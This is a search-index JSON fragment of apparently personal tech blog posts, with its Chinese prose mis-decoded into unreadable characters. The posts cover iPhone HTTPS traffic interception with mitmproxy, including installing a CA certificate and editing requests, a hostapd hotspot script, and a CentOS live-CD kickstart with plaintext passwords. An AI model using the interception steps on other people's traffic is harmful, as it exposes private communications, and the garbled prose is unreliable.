id=\"ä¸‰é…ç½®iphoneå®‰è£…mitmè¯ä¹¦\"\u003eä¸‰ã€é…ç½®iphoneå®‰è£…mitmè¯ä¹¦\u003c/h2\u003e\n\u003cp\u003eæ‰“å¼€æ‰‹æœºï¼Œè·å–wifiçƒ­ç‚¹ï¼Œè®¾ç½®è¿™ä¸ªwifiä½¿ç”¨æ‰‹æœºä»£ç†ï¼Œ192.168.222.1:8080\u003c/p\u003e\n\u003cp\u003eç„¶åç”¨Safariæµè§ˆå™¨æ‰“å¼€ç½‘å€ï¼šhttp://mitm.it\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Float Left\" loading=\"lazy\" src=\"/posts/20211014-iphone_hijack/image-20211014144813987.png?width=200px\"\u003e\u003c/p\u003e\n\u003cp\u003eæ‰¾åˆ°\u003cstrong\u003eIOS\u003c/strong\u003eé‚£è¡Œï¼Œä»”ç»†çœ‹ä¸€çœ‹è¯´æ˜\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Float Left\" loading=\"lazy\" src=\"/posts/20211014-iphone_hijack/image-20211014144923443.png?width=200\"\u003e\u003c/p\u003e\n\u003cp\u003eç‚¹å‡» Get mitmproxy-ca-cert.pem å®‰è£…æè¿°æ–‡ä»¶\u003c/p\u003e\n\u003cp\u003eå®‰è£…å®Œä»¥åï¼Œåœ¨è®¾ç½® \u0026ndash;\u0026gt; å·²ä¸‹è½½æè¿°æ–‡ä»¶ï¼Œå®‰è£…æè¿°æ–‡ä»¶\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Float Left\" loading=\"lazy\" src=\"/posts/20211014-iphone_hijack/image-20211014145145002.png?width=200\"\u003e\u003c/p\u003e\n\u003cp\u003eå®‰è£…å¥½ä»¥åä¼šæ˜¾ç¤ºç»¿è‰²çš„å·²éªŒè¯\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Float Left\" loading=\"lazy\" src=\"/posts/20211014-iphone_hijack/image-20211014154731414.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶ååœ¨æ‰‹æœºä¸Šç”¨ safari è®¿é—®ç½‘å€ï¼šhttps://ip138.com\u003c/p\u003e\n\u003cp\u003eå›åˆ° Ubuntu çš„å‘½ä»¤è¡Œçª—å£ï¼Œä¸Šä¸‹é€‰ä¸­æŠ“åˆ°çš„åŒ…ï¼Œç„¶åæŒ‰å›è½¦æŸ¥çœ‹ï¼Œå·¦å³å…‰æ ‡é”®ç§»åŠ¨ï¼Œå¯ä»¥çœ‹åˆ°responseæ˜¯æ˜æ–‡çš„ï¼Œqé”®æ˜¯è¿”å›ä¸Šä¸€çº§\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211014150022475\" loading=\"lazy\" src=\"/posts/20211014-iphone_hijack/image-20211014150022475.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"å››åŒ…çš„æ‹¦æˆªä¿®æ”¹\"\u003eå››ã€åŒ…çš„æ‹¦æˆªä¿®æ”¹\u003c/h2\u003e\n\u003cp\u003eä¸Šé¢æ¼”ç¤ºçš„æ˜¯å¸¸è§„çš„æŸ¥çœ‹æ“ä½œï¼Œä¸‹é¢ä»‹ç»ä¸€ä¸‹ mitmproxy çš„å¦ä¸€å¼ºå¤§åŠŸèƒ½ï¼Œæ‹¦æˆªä¿®æ”¹ request å’Œ responseã€‚\u003c/p\u003e\n\u003cp\u003eè¾“å…¥ \u003ccode\u003ei\u003c/code\u003eï¼Œç„¶åè¾“å…¥ \u003ccode\u003e~s\u003c/code\u003e å†æŒ‰å›è½¦é”®ï¼Œè¿™æ—¶å€™å°±è¿›å…¥äº† response æ‹¦æˆªæ¨¡å¼ã€‚å¦‚æœè¾“å…¥ \u003ccode\u003e ~q\u003c/code\u003e åˆ™è¿›å…¥ request çš„æ‹¦æˆªæ¨¡å¼ï¼Œæ›´å¤šçš„å‘½ä»¤å¯ä»¥è¾“å…¥ \u003ccode\u003eï¼Ÿ\u003c/code\u003e æŸ¥çœ‹ã€‚æ‹¦æˆªæ¨¡å¼ä¸‹çš„é¡µé¢æ˜¾ç¤ºå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211014150501427\" loading=\"lazy\" src=\"/posts/20211014-iphone_hijack/image-20211014150501427.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå…¶ä¸­çº¢è‰²çš„è¡¨ç¤ºè¯·æ±‚æ­£è¢«æ‹¦æˆªï¼Œè¿™æ—¶ Enter è¿›å…¥å å†æŒ‰ \u003ccode\u003ee\u003c/code\u003e å°±å¯ä»¥ä¿®æ”¹ request æˆ–è€… responseã€‚ä¿®æ”¹æ—¶æ˜¯ç”¨ vim è¿›è¡Œç¼–è¾‘çš„ï¼Œä¿®æ”¹å®ŒæˆåæŒ‰ \u003ccode\u003ea\u003c/code\u003e å°†è¯·æ±‚æ”¾è¡Œï¼Œå¦‚æœè¦æ”¾è¡Œæ‰€æœ‰è¯·æ±‚è¾“å…¥ \u003ccode\u003eA\u003c/code\u003e å³å¯ã€‚\u003c/p\u003e","title":"Iphoneæ‰‹æœºçš„httpsæŠ“åŒ…"},{"content":"å…¬å¸çš„wifiä¿¡å·å¾ˆå¼±ï¼Œä¹Ÿä¸ä¿é™©ã€‚çœäº‹èµ·è§ï¼Œè¿˜æ˜¯è‡ªå·±å»ºç«‹ä¸€ä¸ªå¥½\nusbæ— çº¿ç½‘å¡è®¾å¤‡å¿…é¡»æ˜¯ä¸€ä¸ª nl80211 å…¼å®¹çš„æ— çº¿è®¾å¤‡ï¼Œæ‰€ä»¥é©±åŠ¨å°±æ˜¯è¿™ä¸ªï¼šnl80211\næˆ‘çš„æ“ä½œç³»ç»Ÿæ˜¯Ubuntuï¼Œå¦‚æœæ˜¯CentOSå‘½ä»¤åŸºæœ¬ä¸€æ ·\næ’ä¸Šwifi usbå¡å ip a çœ‹ä¸€ä¸‹ç½‘å¡çš„åç§°ï¼Œæˆ‘è¿™é‡Œæ˜¯ï¼šwlx00a1b0817651ï¼Œå¤Ÿé•¿\nä¸€ã€å®‰è£…hostapdè½¯ä»¶ sudo apt install -y hostapd äºŒã€å»ºç«‹hostapd.confæ–‡ä»¶ vi /etc/hostapd/hostapd.conf driver=nl80211 ssid=Fast_8188 channel=10 interface=wlx00a1b0817651 wpa=2 wpa_passphrase=GreatWall2021! wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP ä¸‰ã€å»ºç«‹å¯åŠ¨è„šæœ¬/usr/local/bin/initAP.sh cat /usr/local/bin/initAP.sh #!/bin/bash start() { rfkill unblock all ifconfig wlx00a1b0817651 up 192.168.222.1 netmask 255.255.255.0 sleep 2 dnsmasq -i wlx00a1b0817651 --dhcp-range=192.168.222.10,192.168.222.20,2h #Enable NAT sysctl -w net.ipv4.ip_forward=1 iptables -F iptables -X iptables -t nat -A POSTROUTING -s 192.168.222.0/24 -j SNAT --to 192.168.41.15 hostapd -B /etc/hostapd/hostapd.conf } stop() { iptables -P INPUT ACCEPT iptables -P FORWARD ACCEPT iptables -P OUTPUT ACCEPT iptables -F iptables -X iptables -t nat -F iptables -t nat -X iptables -t mangle -F iptables -t mangle -X systemctl stop dnsmasq pkill hostapd /sbin/ip link set down dev wlx00a1b0817651 } case $1 in start) start ;; stop) stop ;; *) echo \u0026#34;Usage: $0 {start|stop}\u0026#34; exit 2 esac å››ã€ç”¨rootèº«ä»½æ‰§è¡Œå³å¯ sudo chmod 755 /usr/local/bin/initAP.sh sudo /usr/local/bin/initAP.sh start è¿™æ ·å°±å¯ä»¥ç”¨è‡ªå·±çš„æ‰‹æœºè¿ä¸Šè¿™ä¸ªwifiçƒ­ç‚¹ï¼Œå°½æƒ…å†²æµªå•¦ã€‚\n","permalink":"https://rendoumi.com/posts/20211014-linux_wifi/","summary":"\u003cp\u003eå…¬å¸çš„wifiä¿¡å·å¾ˆå¼±ï¼Œä¹Ÿä¸ä¿é™©ã€‚çœäº‹èµ·è§ï¼Œè¿˜æ˜¯è‡ªå·±å»ºç«‹ä¸€ä¸ªå¥½\u003c/p\u003e\n\u003cp\u003eusbæ— çº¿ç½‘å¡è®¾å¤‡å¿…é¡»æ˜¯ä¸€ä¸ª nl80211 å…¼å®¹çš„æ— çº¿è®¾å¤‡ï¼Œæ‰€ä»¥é©±åŠ¨å°±æ˜¯è¿™ä¸ªï¼šnl80211\u003c/p\u003e\n\u003cp\u003eæˆ‘çš„æ“ä½œç³»ç»Ÿæ˜¯Ubuntuï¼Œå¦‚æœæ˜¯CentOSå‘½ä»¤åŸºæœ¬ä¸€æ ·\u003c/p\u003e\n\u003cp\u003eæ’ä¸Šwifi usbå¡å ip a çœ‹ä¸€ä¸‹ç½‘å¡çš„åç§°ï¼Œæˆ‘è¿™é‡Œæ˜¯ï¼šwlx00a1b0817651ï¼Œå¤Ÿé•¿\u003c/p\u003e\n\u003ch2 id=\"ä¸€å®‰è£…hostapdè½¯ä»¶\"\u003eä¸€ã€å®‰è£…hostapdè½¯ä»¶\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install -y hostapd\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"äºŒå»ºç«‹hostapdconfæ–‡ä»¶\"\u003eäºŒã€å»ºç«‹hostapd.confæ–‡ä»¶\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003evi /etc/hostapd/hostapd.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edriver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003enl80211\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003essid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eFast_8188 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echannel\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003einterface\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003ewlx00a1b0817651\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ewpa\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ewpa_passphrase\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eGreatWall2021!\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ewpa_key_mgmt\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eWPA-PSK\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ewpa_pairwise\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eTKIP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"ä¸‰å»ºç«‹å¯åŠ¨è„šæœ¬usrlocalbininitapsh\"\u003eä¸‰ã€å»ºç«‹å¯åŠ¨è„šæœ¬/usr/local/bin/initAP.sh\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat /usr/local/bin/initAP.sh\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/bash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003estart() {  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erfkill unblock all\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eifconfig wlx00a1b0817651 up 192.168.222.1 netmask 255.255.255.0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esleep 2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ednsmasq -i wlx00a1b0817651 --dhcp-range\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e192.168.222.10,192.168.222.20,2h\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Enable NAT\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esysctl -w net.ipv4.ip_forward\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -F  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -X  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -t nat -A POSTROUTING -s 192.168.222.0/24 -j SNAT --to 192.168.41.15\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ehostapd -B /etc/hostapd/hostapd.conf  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003estop() {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -P INPUT ACCEPT\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -P FORWARD ACCEPT\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -P OUTPUT ACCEPT\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -F\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -X\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -t nat -F\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -t nat -X\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -t mangle -F\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eiptables -t mangle -X\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl stop dnsmasq\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003epkill hostapd\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/sbin/ip link set down dev wlx00a1b0817651\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecase $1 in  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003estart)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"na\"\u003estart\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e;;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003estop)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"na\"\u003estop\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e;;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e*)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eecho \u0026#34;Usage: $0 {start|stop}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eexit 2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eesac\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"å››ç”¨rootèº«ä»½æ‰§è¡Œå³å¯\"\u003eå››ã€ç”¨rootèº«ä»½æ‰§è¡Œå³å¯\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo chmod \u003cspan class=\"m\"\u003e755\u003c/span\u003e /usr/local/bin/initAP.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo /usr/local/bin/initAP.sh start\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·å°±å¯ä»¥ç”¨è‡ªå·±çš„æ‰‹æœºè¿ä¸Šè¿™ä¸ªwifiçƒ­ç‚¹ï¼Œå°½æƒ…å†²æµªå•¦ã€‚\u003c/p\u003e","title":"Ubuntuä¸‹è‡ªå»ºä¸€ä¸ªwifiçƒ­ç‚¹ä¾›æ‰‹æœºä½¿ç”¨"},{"content":"æŸäº›åœºåˆï¼Œå¾ˆæœ‰å¯èƒ½éœ€è¦å¯åŠ¨ISOæˆ–è€…USBç›˜ï¼Œè‡ªå¸¦Linuxç³»ç»Ÿï¼Œç„¶åæ‹¯æ•‘å½“å‰æŸåçš„ç³»ç»Ÿ\næˆ–è€…ç›´æ¥å¯åŠ¨ä¸€ä¸ªLIVE CentOSç³»ç»Ÿï¼Œå»åšæŸäº›äº‹ï¼Œæ¯”å¦‚ç”¨MegaRaidåˆ’åˆ†Raidã€æµ‹è¯•ç³»ç»Ÿç­‰ç­‰\nè¿™æ—¶å€™å°±éœ€è¦åˆ¶ä½œå‡ºæ¥ä¸€ä¸ªLIVE CDçš„ç³»ç»Ÿäº†\nåˆ¶ä½œæ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€å®‰è£…live-tools yum -y install livecd-tools äºŒã€å‡†å¤‡Kickstartæ–‡ä»¶centos7-live-docker.ks ä¸‹è½½åœ°å€ï¼šcentos7-live-docker.ks\nlang en_GB.UTF-8 keyboard us timezone Asia/Shanghai --isUtc #selinux --enforcing selinux --disabled #firewall --enabled --service=cockpit firewall --disabled #xconfig --startxonboot part / --size 8192 --fstype ext4 services --enabled=NetworkManager,sshd --disabled=network # Root password auth --useshadow --enablemd5 rootpw --plaintext Kalaisadog2021 repo --name=base --baseurl=http://mirror.centos.org/centos/7/os/x86_64/ repo --name=updates --baseurl=http://mirror.centos.org/centos/7/updates/x86_64/ repo --name=extras --baseurl=http://mirror.centos.org/centos/7/extras/x86_64/ repo --name=epel --baseurl=http://dl.fedoraproject.org/pub/epel/7/x86_64/ %packages @core kernel dracut bash firewalld NetworkManager e2fsprogs rootfiles docker openssh-server #By zhang ranrui unzip net-tools binutils wget bash-completion bc dmidecode dmraid dmraid-events lvm2 lvm2-libs kpartx mdadm parted xfsdump xfsprogs gdisk bzip2 extundelete libHX libHX-devel autoconf gcc gcc-c++ make screen telnet %end %post systemctl enable docker # By Zhang Ranrui, Add your custom script #wget http://www.rendoumi.com/soft/other/xfs_irecover -O /usr/local/bin/xfs_irecover #chmod 755 /usr/local/bin/xfs_irecover echo \u0026#34;Banner /etc/issue\u0026#34; \u0026gt;\u0026gt; /etc/ssh/sshd_config sed -i \u0026#34;s/After=network\\.target/After=network-online\\.target\\nWants=network-online\\.target/g\u0026#34; /usr/lib/systemd/system/rc-local.service chmod 755 /etc/systemd/system/rc.local.service.d chmod 644 /etc/systemd/system/rc.local.service.d/local.conf chmod 755 /etc/rc.d/rc.local systemctl enable rc-local systemctl start rc-local # FIXME: it\u0026#39;d be better to get this installed from a package cat \u0026gt; /etc/rc.d/init.d/livesys \u0026lt;\u0026lt; EOF #!/bin/bash # # live: Init script for live image # # chkconfig: 345 00 99 # description: Init script for live image. ### BEGIN INIT INFO # X-Start-Before: display-manager ### END INIT INFO . /etc/init.d/functions if ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; rd.live.image || [ \u0026#34;\\$1\u0026#34; != \u0026#34;start\u0026#34; ]; then exit 0 fi if [ -e /.liveimg-configured ] ; then configdone=1 fi exists() { which \\$1 \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || return \\$* } # Make sure we don\u0026#39;t mangle the hardware clock on shutdown ln -sf /dev/null /etc/systemd/system/hwclock-save.service livedir=\u0026#34;LiveOS\u0026#34; for arg in \\`cat /proc/cmdline\\` ; do if [ \u0026#34;\\${arg##rd.live.dir=}\u0026#34; != \u0026#34;\\${arg}\u0026#34; ]; then livedir=\\${arg##rd.live.dir=} return fi if [ \u0026#34;\\${arg##live_dir=}\u0026#34; != \u0026#34;\\${arg}\u0026#34; ]; then livedir=\\${arg##live_dir=} return fi done # enable swaps unless requested otherwise swaps=\\`blkid -t TYPE=swap -o device\\` if ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; noswap \u0026amp;\u0026amp; [ -n \u0026#34;\\$swaps\u0026#34; ] ; then for s in \\$swaps ; do action \u0026#34;Enabling swap partition \\$s\u0026#34; swapon \\$s done fi if ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; noswap \u0026amp;\u0026amp; [ -f /run/initramfs/live/\\${livedir}/swap.img ] ; then action \u0026#34;Enabling swap file\u0026#34; swapon /run/initramfs/live/\\${livedir}/swap.img fi mountDockerDisk() { # support label/uuid if [ \u0026#34;\\${dockerdev##LABEL=}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; -o \u0026#34;\\${dockerdev##UUID=}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; ]; then dockerdev=\\`/sbin/blkid -o device -t \u0026#34;\\$dockerdev\u0026#34;\\` fi # if we\u0026#39;re given a file rather than a blockdev, loopback it if [ \u0026#34;\\${dockerdev##mtd}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; ]; then # mtd devs don\u0026#39;t have a block device but get magic-mounted with -t jffs2 mountopts=\u0026#34;-t jffs2\u0026#34; elif [ ! -b \u0026#34;\\$dockerdev\u0026#34; ]; then loopdev=\\`losetup -f\\` if [ \u0026#34;\\${dockerdev##/run/initramfs/live}\u0026#34; != \u0026#34;\\${dockerdev}\u0026#34; ]; then action \u0026#34;Remounting live store r/w\u0026#34; mount -o remount,rw /run/initramfs/live fi losetup \\$loopdev \\$dockerdev dockerdev=\\$loopdev fi # if it\u0026#39;s encrypted, we need to unlock it if [ \u0026#34;\\$(/sbin/blkid -s TYPE -o value \\$dockerdev 2\u0026gt;/dev/null)\u0026#34; = \u0026#34;crypto_LUKS\u0026#34; ]; then echo echo \u0026#34;Setting up encrypted Docker device\u0026#34; plymouth ask-for-password --command=\u0026#34;cryptsetup luksOpen \\$dockerdev EncDocker\u0026#34; dockerdev=/dev/mapper/EncDocker fi # and finally do the mount mount \\$mountopts \\$dockerdev /var/lib/docker # if we have /home under what\u0026#39;s passed for persistent home, then # we should make that the real /home. useful for mtd device on olpc if [ -d /var/lib/docker/docker ]; then mount --bind /var/lib/docker/docker /var/lib/docker ; fi [ -x /sbin/restorecon ] \u0026amp;\u0026amp; /sbin/restorecon /var/lib/docker } findDockerDisk() { for arg in \\`cat /proc/cmdline\\` ; do if [ \u0026#34;\\${arg##dockerdisk=}\u0026#34; != \u0026#34;\\${arg}\u0026#34; ]; then dockerdev=\\${arg##dockerdisk=} return fi done } if strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; dockerdisk= ; then findDockerDisk elif [ -e /run/initramfs/live/\\${livedir}/docker.img ]; then dockerdev=/run/initramfs/live/\\${livedir}/docker.img fi # if we have a persistent /home, then we want to go ahead and mount it if ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; nodockerdisk \u0026amp;\u0026amp; [ -n \u0026#34;\\$dockerdev\u0026#34; ] ; then action \u0026#34;Mounting persistent /var/lib/docker\u0026#34; mountDockerDisk fi # make it so that we don\u0026#39;t do writing to the overlay for things which # are just tmpdirs/caches mount -t tmpfs -o mode=0755 varcacheyum /var/cache/yum mount -t tmpfs vartmp /var/tmp [ -x /sbin/restorecon ] \u0026amp;\u0026amp; /sbin/restorecon /var/cache/yum /var/tmp \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 if [ -n \u0026#34;\\$configdone\u0026#34; ]; then exit 0 fi # add fedora user with no passwd action \u0026#34;Adding live user\u0026#34; useradd \\$USERADDARGS -c \u0026#34;Live System 